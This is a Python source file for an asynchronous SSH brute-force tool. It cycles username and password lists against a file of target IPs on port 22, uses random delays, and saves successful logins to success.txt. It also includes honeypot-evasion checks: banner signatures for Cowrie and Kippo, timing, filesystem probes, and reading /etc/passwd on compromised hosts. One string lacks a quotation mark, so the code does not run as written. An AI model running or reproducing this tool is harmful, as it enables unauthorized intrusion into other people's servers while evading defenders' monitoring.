import asyncio
import asyncssh
import uvloop
import random
import argparse

lock = asyncio.Lock()

# Honeypot detection flags
check_banner = check_response = check_filesystem = check_error = check_behavior = check_prompt = check_deep = check_normal = False


async def read_file(file_path):
    try:
        async with await asyncio.to_thread(open, file_path, 'r') as f:
            return [line.strip() for line in f if line.strip()]
    except FileNotFoundError:
        print(f"❌ File {file_path} not found!")
        return []


async def write_to_file(file_path, content):
    async with lock:
        async with await asyncio.to_thread(open, file_path, 'a') as f:
            f.write(content + '\n')


# ================= Honeypot Checks ================= #

async def is_honeypot_banner(ip, port):
    try:
        reader, writer = await asyncio.open_connection(ip, port)
        banner = await asyncio.wait_for(reader.read(1024), timeout=5)
        writer.close()
        await writer.wait_closed()
        banner = banner.decode(errors='ignore').strip()

        honeypot_signatures = [
            "Cowrie", "Kippo", "Dionaea", "Honey", "Cisco SSH",
            "SSH-2.0-OpenSSH_5.1p1", "SSH-2.0-OpenSSH_6.0p1 Debian-4",
            "libssh", "SSH-2.0-dropbear", "SSH-2.0-OpenSSH_7.2p2 Ubuntu-4ubuntu2.8",
            "SSH-2.0-OpenSSH_5.3", "Go", "libssh-0.5.2"
        ]
        suspicious_keywords = [
            "auth", "alert", "monitor", "log", "unauthorized",
            "access denied", "honeypot", "security", "warning", "surveillance",
            "authentication failed", "further authentication required",
            "this system is monitored", "intrusion", "incident", "error",
            "suspicious", "logged", "trace", "attempt", "forensic", "pre-authentication", "banner message from server"
        ]

        if any(sig.lower() in banner.lower() for sig in honeypot_signatures):
            await write_to_file('honeypot.txt', f"{ip}:{port} → 🚩 Suspicious SSH banner: '{banner[:100]}'")
            return True

        if any(keyword.lower() in banner.lower() for keyword in suspicious_keywords):
            await write_to_file('honeypot.txt', f"{ip}:{port} → 🚩 Suspicious keyword in banner: '{banner[:100]}'")
            return True

        if len(banner) < 10 or "SSH-2.0" not in banner:
            await write_to_file('honeypot.txt', f"{ip}:{port} → 🚩 Banner too short or invalid: '{banner[:100]}'")
            return True

        return False
    except:
        return False


async def is_honeypot_response_time(ip, port):
    try:
        start_time = asyncio.get_event_loop().time()
        reader, writer = await asyncio.open_connection(ip, port)
        await asyncio.wait_for(reader.read(1024), timeout=5)
        writer.close()
        await writer.wait_closed()
        rt = asyncio.get_event_loop().time() - start_time
        return rt > 2.0 or rt < 0.05
    except:
        return False


async def is_honeypot_filesystem(ip, port, username, password):
    try:
        async with asyncssh.connect(ip, port=port, username=username, password=password, known_hosts=None, timeout=5) as conn:
            root_dirs = (await conn.run('ls /', timeout=5)).stdout.strip().split()
            suspicious_root = len(root_dirs) <= 3

            home_dirs = (await conn.run('ls ~', timeout=5)).stdout.strip()
            suspicious_home = home_dirs == ""

            if suspicious_root:
                await write_to_file('honeypot.txt', f"{ip}:{port} → 🚩 Abnormal root directory: {root_dirs}")
            if suspicious_home:
                await write_to_file('honeypot.txt', f"{ip}:{port} → 🚩 Empty home directory.")

            return suspicious_root or suspicious_home
    except:
        return False


async def is_honeypot_error_messages(ip, port, username, password):
    try:
        await asyncssh.connect(ip, port=port, username=username, password="thisiswrong", known_hosts=None, timeout=5)
        return True  # Should never allow wrong password
    except asyncssh.PermissionDenied as e:
        return "authentication failed" not in str(e).lower()
    except:
        return False


async def is_honeypot_behavior(ip, port, username, password):
    try:
        async with asyncssh.connect(ip, port=port, username=username, password=password, known_hosts=None, timeout=5) as conn:
            output = (await conn.run('echo hello', timeout=5)).stdout.strip().lower()
            return "hello" not in output
    except:
        return False


async def is_honeypot_prompt(ip, port, username, password):
    try:
        async with asyncssh.connect(ip, port=port, username=username, password=password, known_hosts=None, timeout=5) as conn:
            chan, session = await conn.create_session(lambda: asyncssh.SSHClientSession(), term_type='xterm')
            await asyncio.sleep(1)
            data = ""
            while chan.available:
                data += (await chan.read(1024)).strip()
            prompt_indicators = ['~', '#', '$', '@']
            is_hp = not any(p in data for p in prompt_indicators)
            if is_hp:
                await write_to_file('honeypot.txt', f"{ip}:{port} → 🚩 Missing shell prompt: '{data[:100]}'")
            return is_hp
    except:
        return False


async def is_honeypot_deep_check(ip, port, username, password):
    try:
        async with asyncssh.connect(ip, port=port, username=username, password=password, known_hosts=None, timeout=6) as conn:
            uname_out = (await conn.run("uname -a", timeout=5)).stdout.lower()
            suspicious_keywords = [
                "important", "secret command", "honeypot", "alert", "monitor", "unauthorized",
                "surveillance", "incident", "logged", "fake"
            ]
            if any(k in uname_out for k in suspicious_keywords):
                await write_to_file('honeypot.txt', f"{ip}:{port} → 🚩 Suspicious uname: '{uname_out[:100]}'")
                return True

            passwd_out = (await conn.run("cat /etc/passwd", timeout=5)).stdout.strip().splitlines()
            if len(passwd_out) < 3:
                return True
            hashes = [line.split(":")[1] for line in passwd_out if ":" in line]
            if all(h == hashes[0] for h in hashes) and hashes[0] not in ['x', '*'] and not hashes[0].startswith('$'):
                return True
            if any(len(h) > 1 and h not in ['x', '*'] and not h.startswith('$') for h in hashes):
                return True
        return False
    except:
        return True


# ================= Core Scanner ================= #

async def is_honeypot(ip, port, username, password):
    reasons = []
    if check_banner and await is_honeypot_banner(ip, port):
        reasons.append("🚩 Suspicious SSH banner")
    if check_response and await is_honeypot_response_time(ip, port):
        reasons.append("🐢 Abnormal response time")
    if check_filesystem and await is_honeypot_filesystem(ip, port, username, password):
        reasons.append("📂 Fake/empty filesystem")
    if check_error and await is_honeypot_error_messages(ip, port, username, password):
        reasons.append("🔓 Abnormal login error")
    if check_behavior and await is_honeypot_behavior(ip, port, username, password):
        reasons.append(⚙️ Abnormal command behavior")
    if check_prompt and await is_honeypot_prompt(ip, port, username, password):
        reasons.append("📜 Missing shell prompt")
    if check_deep and await is_honeypot_deep_check(ip, port, username, password):
        reasons.append("🧪 Suspicious uname/passwd")
    return reasons


async def check_ssh(ip, port, username, password):
    if not check_normal:
        hp_reasons = await is_honeypot(ip, port, username, password)
        if hp_reasons:
            reason_text = " | ".join(hp_reasons)
            print(f"[HONEYPOT] {ip}:{port} | {username} | {password} → {reason_text}")
            await write_to_file('honeypot.txt', f"{ip}:{port} | {username} | {password} → {reason_text}")
            return False

    try:
        async with asyncssh.connect(ip, port=port, username=username, password=password, known_hosts=None, timeout=8):
            print(f"[SUCCESS] {ip}:{port} | {username} | {password}")
            await write_to_file('success.txt', f"{ip}:{port} | {username} | {password}")
            return True
    except asyncssh.PermissionDenied:
        print(f"[FAILED] {ip}:{port} | {username} | {password}")
        return False
    except Exception as e:
        print(f"[ERROR] {ip}:{port} | {username} | {password} | {e}")
        return False


async def brute_worker(ip, port, username, passwords, max_attempts=20):
    attempts = 0
    for pwd in passwords:
        if attempts >= max_attempts:
            break
        if await check_ssh(ip, port, username, pwd):
            break
        attempts += 1
        await asyncio.sleep(random.uniform(0.05, 0.2))


async def main():
    global check_banner, check_response, check_filesystem, check_error, check_behavior, check_prompt, check_deep, check_normal

    parser = argparse.ArgumentParser()
    parser.add_argument('--banner', action='store_true')
    parser.add_argument('--response', action='store_true')
    parser.add_argument('--filesystem', action='store_true')
    parser.add_argument('--error', action='store_true')
    parser.add_argument('--behavior', action='store_true')
    parser.add_argument('--prompt', action='store_true')
    parser.add_argument('--deep', action='store_true')
    parser.add_argument('--normal', action='store_true')
    parser.add_argument('--all', action='store_true')
    args = parser.parse_args()

    if args.all:
        check_banner = check_response = check_filesystem = check_error = check_behavior = check_prompt = check_deep = True
    else:
        check_banner = args.banner
        check_response = args.response
        check_filesystem = args.filesystem
        check_error = args.error
        check_behavior = args.behavior
        check_prompt = args.prompt
        check_deep = args.deep
        check_normal = args.normal

    ip_list = await read_file('cc.txt')
    passwords = await read_file('pass.txt')
    users = await read_file('users.txt') or ['root']

    if not ip_list or not passwords:
        print("❌ Missing IP or password list")
        return

    random.shuffle(ip_list)
    random.shuffle(users)
    random.shuffle(passwords)

    tasks = []
    for ip in ip_list:
        for user in users:
            tasks.append(brute_worker(ip, 22, user, passwords))

    await asyncio.gather(*tasks)


if __name__ == "__main__":
    uvloop.install()
    asyncio.run(main())
